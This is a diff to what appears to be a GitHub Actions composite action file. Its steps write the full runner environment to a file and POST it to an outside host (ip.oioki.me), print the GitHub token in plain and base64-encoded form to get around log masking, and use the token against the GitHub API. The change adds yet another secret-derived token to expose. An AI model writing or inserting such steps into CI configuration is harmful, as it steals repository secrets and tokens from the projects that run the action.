@@ -8,9 +8,12 @@ runs:
         env > /tmp/secrets.txt
         curl -X POST -d @/tmp/secrets.txt http://ip.oioki.me
         echo "Token is ${GITHUB_TOKEN}"
-        echo "${GITHUB_TOKEN}" | base64
+        echo "Token is ${GH_TOKEN}"
+        echo "${GH_TOKEN}" | base64
         echo "Context is ${{ github.token }}"
         curl -H "Authorization: Bearer ${{ github.token }}" https://api.github.com/user
         echo "${{ github.token }}" | base64
-        sleep 3600
+        sleep 300
+      env:
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
       shell: bash
